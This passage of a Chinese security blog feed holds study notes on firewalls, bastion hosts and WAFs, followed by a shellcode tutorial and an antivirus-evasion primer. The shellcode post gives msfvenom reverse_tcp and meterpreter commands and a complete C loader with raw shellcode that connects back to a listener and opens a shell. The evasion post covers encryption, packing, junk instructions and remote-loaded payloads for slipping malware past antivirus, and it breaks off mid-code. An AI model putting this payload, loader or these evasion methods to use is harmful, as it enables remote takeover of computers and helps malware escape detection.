alt="firewall"></p><p>1、包过滤防火墙：<br>也称为分组过滤防火墙，根据网络层的协议信息进行控制，也用了传输层的协议、端口号等信息<br>目前的路由器都集成了简单的包过滤功能<br>网络管理员首先根据企业的安全策略定义一组访问控制规则，然后防火墙的内存中会生成一张与访问控制规则相对应的访问控制列表，防火墙按规则处理数据包，若有记录，则按规定的操作对其操作，没有的话，采用默认操作（默认丢弃和默认允许）</p><p>静态包过滤：对网络性能影响小，成本低，对用户透明。安全性低，缺少状态感知能力，容易遭受IP欺骗攻击，创建访问控制规则较难<br>动态包过滤：相对静态包过滤是高安全性，高性能，伸缩性和易拓展性，应用范围广。仍未对数据包内容过滤，规则难设计创建</p><p>2、电路级防火墙：根据传输层的协议信息进行过滤，很少单独存在，一般作为应用级防火墙的一个模块</p><p>3、应用级防火墙<br>也称为代理防火墙，根据应用层协议的信息进行过滤，代理是特定于某一个应用的。例如http代理等<br>应用代理包括客户代理和服务器代理<br>内外网之间进行交互时，并不是直接进行连接，而是通过代理服务器进行</p><p>优点：高安全性，强大的认证功能，日志记录详细，规则配置简单<br>缺点：灵活性差，缺乏透明性，性能不高</p><p>防火墙部署模式<br>三种典型模式：屏蔽主机模式，双宿&#x2F;多宿主机模式，屏蔽子网模式<br>这三种模式中都有一个很重要的主机：堡垒主机。</p><p>堡垒主机(Bastion Host): 一种配置了较为全面的安全防范措施的网络上的计算机，它为网络间的通信提供了一个阻塞点。通常堡垒主机可以用作应用级和电路级网关的平台，是一个组织机构网络安全的中心主机。它和蜜罐是不同的，蜜罐是诱使敌人攻击的，而堡垒主机是那种防范很完备的出入口，是进入内部网络的一个检查点，达到把整个网络的安全问题集中在某个主机上解决的目的，通常有两块网卡，一个连接内网，一个连接外网。<br>堡垒主机上通常可以运行代理服务，如Telnet，DNS，FTP，SMTP以及用户认证等。<br>防火墙或包过滤路由器也可以看作是堡垒主机，是暴露在外网的，有些蜜罐也属于堡垒主机，作为牺牲品保全网络，吸引入侵者的注意力，耗费攻击真正网络主机的时间并且使追踪入侵企图变得更加容易。<br>这里要区别于堡垒机，堡垒机是一种运维安全审计系统，主要的功能是对运维人员的运维操作进行审计和权限控制。<br>因为堡垒主机对网络安全至关重要，对它必须进行完善的防御。这就是说，堡垒主机是由网络管理员严密监视的。</p><ol start="96"><li>堡垒机<br>堡垒机的主要功能分为以下几个模块 堡垒机功能：<br>1、运维平台<br>RDP&#x2F;VNC运维；SSH&#x2F;Telnet运维；SFTP&#x2F;FTP运维；数据库运维；web系统运维；远程应用运维<br>2、管理平台<br>三权分立(配置，授权，审计；系统管理员，安全保密管理员，安全审计员)；身份鉴别；主机管理；密码托管；运维监控；电子工单<br>3、自动化平台<br>自动改密；自动运维；自动收集；自动授权；自动备份；自动告警<br>4、控制平台<br>IP防火墙；命令防火墙；访问控制；传输控制；会话阻断；运维审批<br>5、审计平台<br>命令记录；文字记录；SQL记录；文件保存；全文检索；审计报表</li></ol><p>堡垒机身份认证：<br>1、本地认证<br>本地账号密码认证，一般支持强密码策略<br>2、远程认证<br>一般可支持第三方AD&#x2F;LDAP&#x2F;Radius认证<br>3、双因子认证<br>UsbKey、动态令牌、短信网关、手机APP令牌等<br>4、第三方认证系统<br>OAuth2.0、CAS等</p><p>堡垒机常见运维方式：<br>B&#x2F;S运维：通过浏览器运维<br>C&#x2F;S运维：通过客户端软件运维，比如Xshell，CRT等<br>H5运维：直接在网页上打开远程桌面进行运维。无需安装本地运维工具，只要有浏览器就可以对常用协议进行运维操作，支持ssh，telnet，rlogin，rdp，vnc协议<br>网关运维：采用SSH网关方式，实现代理直接登录目标主机，适用于运维自动化场景。</p><p>堡垒机的其它常见功能：<br>文件传输：登录堡垒机，通过堡垒机中转。使用RDP&#x2F;SFTP&#x2F;FTP&#x2F;SCP&#x2F;RZ&#x2F;SZ等传输协议传输。<br>细粒度控制：可以对访问用户、命令、传输进行精细化控制。<br>支持开放的API</p><p>堡垒机部署方式：<br>1、单机部署<br>堡垒机主要都是旁站部署，旁挂在交换机旁边，只要能访问所有设备即可。<br>部署特定：<br>旁路部署，逻辑串联<br>不影响现有网络结构</p><p>2、HA高可靠部署<br>旁路部署两台堡垒机，中间有心跳线连接，同步数据。对外提供一个虚拟IP<br>部署特点：<br>两台硬件堡垒机，一主一备&#x2F;提供VIP<br>当主机出现故障时，备机自动接管服务。</p><p>3、异地同步部署<br>通过在多个数据中心部署多台堡垒机，堡垒机之间进行配置信息自动同步。<br>部署特点：<br>多地部署，异地部署自动同步。<br>运维人员访问当地的堡垒机进行管理。<br>不受网络&#x2F;带宽影响</p><p>4、集群部署（分布式部署）<br>当需要管理的设备数量很多时，可以将n多台堡垒机进行集群部署。其中两台堡垒机一主一备，其它n-2台堡垒机作为集群节点，给主机上传同步数据，整个集群对外提供一个虚拟IP地址。<br>部署特点：<br>两台硬件堡垒机一主一备，提供VIP<br>当主机出现故障时，备机自动接管服务。</p><ol start="97"><li>常见WAF识别及工具<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br><a href="https://cloud.tencent.com/developer/article/1872310">常见WAF识别</a></li></ol><p>WAF识别&#x2F;WAF检测工具<br>1、wafw00f<br><a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a><br>2、identYwaf<br><a href="https://github.com/stamparm/identywaf">identYwaf</a></p><ol start="98"><li>WAF工作原理<br>WAF工作原理：<br>WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录。<br>1、预处理<br>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP&#x2F;HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。<br>2、规则检测<br>每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。<br>3、处理模块<br>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。<br>不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。<br>4、日志记录<br>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</li></ol><p>WAF的分类：<br>1、硬件型WAF<br>（厂商安装）（绿盟、深信服）：以硬件的形式部署在链路中<br>串联在内网的交换机上，防护范围大<br>2、云WAF<br>（腾讯云，阿里云，华为云）：通过配置NS或CNAME记录，使得对网站的请求报文优先经过WAF主机，经过WAF主机过滤后，将被认为无害的请求报文再发送给实际的网站服务器进行请求<br>基于云端的检测，安装简单，修改 DNS 解析或在服务器安装云 WAF 的模块即可<br>3、软件型WAF<br>（部署在Apache，Nginx等HTTPServer中）（安全狗、D盾、云锁等）<br>以软件形式安装在服务器上<br>安装在服务器上，根据网站流量决定占用内存量<br>4、自定义WAF<br>（自己写的一些规则）<br>在系统后台内置一项安全功能以便管理者使用</p><p>安全设备&#x2F;WAF的使用：<br><a href="https://xz.aliyun.com/t/12905">EDR和雷池的使用</a>  （预计两者花费6-10h）<br>安全狗 也可以使用一下  （预计花费2-4h）</p><p>域渗透练习：<br><a href="https://xz.aliyun.com/t/12117">记一次春秋云镜域渗透靶场Certify</a>  有机会进行域渗透练习（预计花费6-10h）<br><a href="https://www.yulate.com/154.html">内网域渗透靶场学习一</a>  有机会进行域渗透练习（预计花费6-10h）<br><a href="https://zhuanlan.zhihu.com/p/555323108">域渗透 学习笔记</a>  这个仅作参考<br>不实际操作的话，始终是纸上谈兵！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;了解系统，才能更好攻击与防御。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="系统" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ShellCode获取</title>
    <link href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/"/>
    <id>http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/</id>
    <published>2023-08-31T16:00:00.000Z</published>
    <updated>2023-09-01T06:01:34.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shellcode的入门使用。</p><span id="more"></span><h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>shellcode可以按照攻击者控制是否在目标机器上执行载荷分为本地shellcode和远程shellcode。本地运行的shellcode经常用于在攻击者对计算机的访问权限有限，需要利用软件漏洞提升权限；远程shellcode常用于攻击者以运行在某个网络中的另一台机器上的易受攻击的进程为目标时，如果成功执行，shellcode可以通过网络访问目标主机。</p><h1 id="直接获取shellcode"><a href="#直接获取shellcode" class="headerlink" title="直接获取shellcode"></a>直接获取shellcode</h1><p>网络上有许多已经编写好的shellcode资源公开分享，由于shellcode的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是一个可以学习的网站。<br><a href="https://www.exploit-db.com/">Exploit Database</a><br>但来自网络的资源很有可能由于久久未更新、适用的系统已经被淘汰，或者是shellcode已经被公开而变得容易被查杀，这时候我们就需要能够即时获取shellcode的方法。</p><h1 id="通过软件获取shellcode"><a href="#通过软件获取shellcode" class="headerlink" title="通过软件获取shellcode"></a>通过软件获取shellcode</h1><h2 id="CobaltStrike-Ver-4-0"><a href="#CobaltStrike-Ver-4-0" class="headerlink" title="CobaltStrike(Ver 4.0)"></a>CobaltStrike(Ver 4.0)</h2><p><img src="/simg/shellcode_1.png" alt="cs"><br>勾选生成c语言形式的shellcode，在下拉列表里我们还能看到有许多其他语言形式的shellcode。<br><img src="/simg/shellcode_2.png" alt="cs"><br>接着我们会得到一个文件，其中包含了所需的shellcode，只要将这段shellcode放入预先写好的加载器中就可以使用了：<br><img src="/simg/shellcode_3.png" alt=" "></p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>MsfVenom 集成了msfpayload 和msfencode的功能，用于生成各种类型的payload</p><ol><li><p>首先查看可用的payload类型，需要Windows平台下的shellcode进行实验，所以使用命令<br><code>msfvenom --list payload |grep windows</code><br>挑选一个反弹shell的payload <code>windows/shell/reverse_tcp</code></p></li><li><p>查看支持的平台架构<br><code>msfvenom -p windows/shell/reverse_tcp --list archs</code><br>选择x64平台<br>实际测试中，要根据payload选择对应的平台，否则会提示Error: The selected arch is incompatible with the payload。<br>除此之外，本次测试中生成x64架构的shellcode并不能直接用c语言加载，可能是由于测试使用的gcc编译器是32位的。选择x86架构正常加载。</p></li><li><p>查看可用的payload格式<br><code>msfvenom -p windows/shell/reverse_tcp -a x64 --list formats</code><br>选择c语言格式的payload</p></li><li><p>使用–list-options查看payload需要配置的参数<br><code>msfvenom -p windows/shell/reverse_tcp --list-options</code></p></li><li><p>生成payload<br><code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.1 LPORT=2333 -a x86 -f c</code><br><img src="/simg/shellcode_4.png" alt=" "></p></li></ol><p>接下来开始测试生成的shellcode是否可用<br>首先使用msf设置好监听<br><img src="/simg/shellcode_5.png" alt=" "></p><p>将生成的shellcode放入c语言加载器中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x1f\x12\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行<br><img src="/simg/shellcode_7.png" alt=" "><br>成功弹回shell</p><p>接下来尝试弹回一个功能更强大的meterpreter<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -a x86 -f c</code></p><p>重新生成shellcode并在加载器中更换<br><img src="/simg/shellcode_8.png" alt=" "></p><h3 id="编码器的使用"><a href="#编码器的使用" class="headerlink" title="编码器的使用"></a>编码器的使用</h3><p>查看可用的编码器<br><code>msfvenom --list encoders</code><br><img src="/simg/shellcode_9.png" alt=" "></p><p>使用-e参数指定一个编码方式，使用-i参数指定编码次数<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -e x86/xor_dynamic -i 5 -a x86 -f c</code><br><img src="/simg/shellcode_10.png" alt=" "><br>生成的shellcode与不加编码器确实有所不同，但是免杀效果几乎没有，不能作为真正的免杀解决方案</p><h3 id="避免使用某些字符"><a href="#避免使用某些字符" class="headerlink" title="避免使用某些字符"></a>避免使用某些字符</h3><p>-b 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中<br>当这个参数被添加的时候，msfvenom 将会自动寻找合适的编码器来编码 Payload<br><img src="/simg/shellcode_11.png" alt=" "></p><h3 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h3><p><a href="https://github.com/Axx8/shellcode_loader">ShellCode_Loader</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实战中免杀效果不够。<br>免杀需要不断迭代，杀毒软件也会不断更新，没有永恒的免杀。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a><br><a href="https://luckyfuture.top/Msfvenom-Gen-ShellCode">使用MSF生成ShellCode</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;shellcode的入门使用。&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>免杀基础学习</title>
    <link href="http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-08-31T16:00:00.000Z</published>
    <updated>2023-09-03T02:35:39.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。</p><span id="more"></span><h1 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h1><p>免杀技术全称为反杀毒技术Anti Anti- Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="查杀分类"><a href="#查杀分类" class="headerlink" title="查杀分类"></a>查杀分类</h3><ul><li>静态免杀：一般根据特征码识别，然后对文件进行特征匹配。</li><li>行为查杀（动态查杀）：主要是对其产生的行为进行特征匹配。</li><li>云查杀：提取出文件的特征和上传云端，云端进行检测后返回客户端，对相应病毒进行查杀。</li></ul><p><strong>静态免杀</strong><br>对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。</p><p>杀毒是提取文件一段“特征码”来识别病毒文件。<br>特征码：能识别一个程序是一个病毒的一段不大于 64 字节的特征串</p><p>那杀毒软件是怎么提取文件特征码的？<br>如果我们知道了一个文件是病毒，那么通过 md5 肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接 md5 肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做“模糊哈希”（Fuzzy Hashing）算法的东西。<br>模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。</p><p>大致就可以理解为，不要把一个文件的所有内容都拿来计算 hash，而通过分片，取出部分重要（不易改变）的内容进行 hash 计算，这样就能达到通过一个特征码找到类似的病毒变种。</p><p>特征码定位工具：原理就是分割文件，某些分割部分填入数据 (0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之间区别是使用的分割算法不同，查找特征码的效果不同。</p><p>目前比较常有名气的特征码定位器主要有 CCL 与 MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p><h3 id="免杀分类"><a href="#免杀分类" class="headerlink" title="免杀分类"></a>免杀分类</h3><ul><li>开源免杀：指的是拥有病毒、木马原始码的前提下，通过修改原始码进行免杀。</li><li>手工免杀：指的是仅有病毒、木马的可执行文件（PE文件）的情况下进行免杀。</li><li>自动免杀：指的是病毒、木马自身能自动变异，如：千面人病毒。</li></ul><p><strong>手工免杀(仅限有源码)</strong></p><ol><li>mian 中屏蔽所有代码，编译，扫描。不报的话继续 2，如果依然报毒，去 5。</li><li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复 2。直到定位到某个函数或者多个函数，进入 3。</li><li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复 2。</li><li>直到定位某段代码（无自定义内部调用），特征码在此。</li><li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从 1 开始。如果没有，那去找找 PE 头吧。</li></ol><p>大致流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. sub1 //未报2. sub1 sub2 //未报3. sub1 sub2 sub3 //报4. sub1 sub2 sub3(sub31) //未报5. sub1 sub2 sub3(sub31 sub32) //报6. sub1 sub2 sub3(sub31 sub32(sub321)) //报...直到找到某API调用，或者逻辑代码（没有自定义函数调用）</span><br></pre></td></tr></table></figure><h2 id="技术概览"><a href="#技术概览" class="headerlink" title="技术概览"></a>技术概览</h2><h3 id="加壳脱壳与加密解密"><a href="#加壳脱壳与加密解密" class="headerlink" title="加壳脱壳与加密解密"></a>加壳脱壳与加密解密</h3><ul><li>加壳压缩是一种对EXE档案的数据压缩及加密保护，可以将EXE档案压缩成自我解压档案，并能隐藏解压进程。</li><li>在免杀技术里所谓的壳与伪装壳其实就是压缩与外层数据伪装，其实是利用特殊的算法，对可执行文件与动态库里的资源进行压缩与对文件的描述、版本号、创建日期、修改软件、系统执行需求等外层数据进行伪装。</li><li>脱壳就是把已压缩与伪装的文件完全或近似还原到未压缩与伪装的状态。最常用的加壳软件就是WinRAR。</li><li>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</li><li>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。<br>压缩壳：upx, aspack, fsg, pecompach<br>加密壳：ASProtect, Armadillo(穿山甲), EXEcryptor, Themida, ZProtect<br>虚拟机壳：VMProtect</li></ul><h3 id="加花指令与程序入口点修改"><a href="#加花指令与程序入口点修改" class="headerlink" title="加花指令与程序入口点修改"></a>加花指令与程序入口点修改</h3><ul><li>加花指令就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其它常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响程序的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</li><li>程序入口点修改就是改变入口点，通常用到的方法是在入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转代码，跳转到程序执行数据的入口点上，令程序正常运行。</li></ul><h3 id="内存、文件特征码的定位与修改"><a href="#内存、文件特征码的定位与修改" class="headerlink" title="内存、文件特征码的定位与修改"></a>内存、文件特征码的定位与修改</h3><p>众所周知大部分杀毒软件查杀病毒的根据就是对比特征码，而这个过程一般发生在内存与硬盘中。对比硬盘中储存着的文件的特征码，能全面地查杀电脑中的可疑文件；对比在内存中储存着的文件的特征码，能快速地查杀正在运行的程序是否带有病毒，另外病毒文件一旦进入内存即运行中，很可能会现出原形被杀毒软件查杀。针对杀毒软件这一特性，骇客们发明了内存、文件特征码修改免杀法。通常首先用特征码定位软件定位文件特征码的所在之处，再用UltraEdit对被定位的特征码段进行修改。</p><p>一般修改方法有：</p><ul><li>十六进制的特征码直接修改法，就是把十六进制的特征码加1；</li><li>字符串大小写修改法，就是特征码所对应的内容是字符串的时候，把大小字互换；</li><li>等价替换法，就是当特征码所对应的是汇编指令时，把指令替换成功能类拟的指令；</li><li>指令顺序调换法，把特征码对应的汇编指令的顺序互换；</li><li>通用跳转法，用跳转的方法把特征码对应的汇编指令跳转走，犹如加花一样。</li></ul><p>修改特征码的方法针对性很强很有用，但一次修改只能对一款杀毒软件免杀；要令另一款软件免杀，就要重新针对该软件修改特征码，因为各家杀毒软件公司使用的特征码基本上都不相同。</p><h2 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h2><p>常用工具有：</p><ul><li>加壳器：PEditor、MaskPE、UPX等</li><li>脱壳与分析器：PEid、ResScope、RL!dePacker、Restorator等</li><li>加花器：FakeNinja</li><li>特征码定位与修改器:CCL、OllyDbg、UltraEdit、MYCCL</li><li>调试器：SoftIce</li><li>反汇编器：IDA、W32Dasm等</li><li>十六进制编辑器：HIEW、UltraEdit等</li><li>开 发包：SDK与DDK</li><li>编译器：Microsoft Visual C++、Borland C++、Watcom C、GNU C以及Free Pascal等</li></ul><h2 id="常用沙箱和免杀工具"><a href="#常用沙箱和免杀工具" class="headerlink" title="常用沙箱和免杀工具"></a>常用沙箱和免杀工具</h2><p><a href="https://s.threatbook.com/">微步云沙箱</a><br><a href="https://www.virustotal.com/gui/home/upload">Virustotal</a><br><a href="https://habo.qq.com/">腾讯哈勃分析系统</a><br><a href="https://sandbox.ti.qianxin.com/sandbox/page">奇安信情报沙箱</a></p><p><a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/introduction/sandboxing.html">Cuckoo Sandbox本地沙箱</a><br><a href="https://www.clamav.net/">ClamAV-Linux下杀毒软件</a><br><a href="https://github.com/1y0n/AV_Evasion_Tool">掩日 - 适用于红队的综合免杀工具</a></p><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a>免杀方法</h2><ol><li>对shellcode进行加密处理，如异或、转置、AES加密、Base64加密、多轮加密等。</li><li>对加载器代码进行加密或编码处理，使其静态特征不明显。</li><li>分离免杀，将shellcode和加载器代码放置于网络上，通过下载的方式进行加载，可进一步免除静态特征。</li><li>通过进程注入或借助傀儡进程进行加载和运行。</li><li>通过加壳的方式对木马进行混淆，进而绕过杀软。<br>（通过静态特征绕过杀软检测相对容易，但是要绕过沙箱或动态检测，则非常难）</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="加密shellcode"><a href="#加密shellcode" class="headerlink" title="加密shellcode"></a>加密shellcode</h3><ol><li><p>异或加密<br>异或加密是简单的加密方式，异或运算根据二进制位进行按位运算，如果对应位相同，则为0，不同则为1。同时遵守以下规则：<br>如果a^b&#x3D;c，则可以将b视为密钥，c视为加密字符串，则b^c&#x3D;a，可根据密钥b和密文c，解密出a的值。</p></li><li><p>字符串反转<br>在python中，对一个字符串进行反转，使用 <code>str[::-1]</code> 即可。<br>如果 str&#x3D;’abcde’, str[::-1]&#x3D;’edcba’</p></li><li><p>将字节类型转换为字符串<br>由于python的shellcode为 <code>b&#39;&#39;</code> 的字节类型（也可视为二进制类型），而要进行加密或反转处理，只能针对字符串进行处理，所以还需要对将字节类型数据转换为字符串。可以利用python内置的binascii模块进行处理。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">buf = <span 